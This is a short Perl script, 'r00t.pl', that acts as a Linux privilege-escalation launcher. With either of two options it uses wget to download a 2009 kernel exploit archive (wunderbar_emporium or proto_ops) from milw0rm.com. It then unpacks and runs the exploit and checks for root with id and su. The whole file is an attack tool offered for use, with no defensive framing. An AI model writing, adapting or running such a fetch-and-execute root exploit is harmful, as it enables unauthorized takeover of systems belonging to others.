#!/usr/bin/perl
#Coded By Very Secret
if(@ARGV < 1){ 
print q( 
usage : perl r00t.pl -A
usage : perl r00t.pl -B
);exit;} 


if ($ARGV[0] =~ "-A" ) 
          {
print "1) Exploit 1.\n";
system "pwd";
system "wget http://milw0rm.com/sploits/2009-wunderbar_emporium.tgz";
sleep(2);
print "0k...\n";
system "tar -xf 2009-wunderbar_emporium.tgz";
sleep(2);
print "0k...\n";
system "cd wunderbar_emporium;./wunderbar_emporium.sh";
print "0k...\n";
system "uname -a;pwd;id;su";
     }

if ($ARGV[0] =~ "-B" ) 
          {
     print "2) Exploit 2.\n";
system "pwd";
system "wget http://milw0rm.com/sploits/2009-proto_ops.tgz";
sleep(2);
print "0k...\n";
system "tar -xf 2009-proto_ops.tgz";
sleep(2);
print "0k...\n";
system "chmod 777 run.sh";
system "./run.sh";
print "0k...\n";
system "uname -a;pwd;id;su";
     }